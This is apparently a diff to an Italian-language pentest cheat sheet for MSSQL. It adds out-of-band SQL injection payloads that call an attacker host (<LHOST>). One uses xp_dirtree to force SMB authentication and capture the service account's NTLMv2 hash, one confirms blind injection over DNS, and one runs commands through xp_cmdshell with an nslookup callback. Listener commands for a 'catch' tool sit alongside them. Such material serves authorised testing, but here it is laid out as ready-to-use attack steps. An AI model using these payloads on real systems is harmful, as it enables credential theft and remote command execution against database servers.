@@ -43,6 +43,39 @@ python3 mssqlclient.py sa@<IP>                            # Auth SQL diretta
 nxc mssql <IP> -u 'sa' -p 'password' --query 'SELECT @@version;'
 ```
 
+## OOB con catch
+
+MSSQL ha funzioni native per fare callback OOB — perfette per blind SQLi.
+
+```bash
+# Cattura hash NTLMv2 via xp_dirtree:
+catch smb on
+
+# Oppure conferma blind via DNS:
+catch dns on
+catch dns token
+```
+
+### Blind SQLi — conferma via SMB (xp_dirtree)
+
+```sql
+'; EXEC master..xp_dirtree '\\<LHOST>\x'--
+```
+→ `catch logs smb` mostra l'hash NTLMv2 dell'utente del servizio MSSQL.
+
+### Blind SQLi — conferma via DNS
+
+```sql
+'; EXEC master..xp_dirtree '\\<TOKEN>.<LHOST>\x'--
+```
+→ `catch logs dns` mostra la query DNS con il token.
+
+### Blind RCE — xp_cmdshell + DNS
+
+```sql
+'; EXEC xp_cmdshell 'nslookup <TOKEN>.<LHOST>'--
+```
+
 ## Tool consigliati
 
 *Installa con `use <tool>` + `install`*
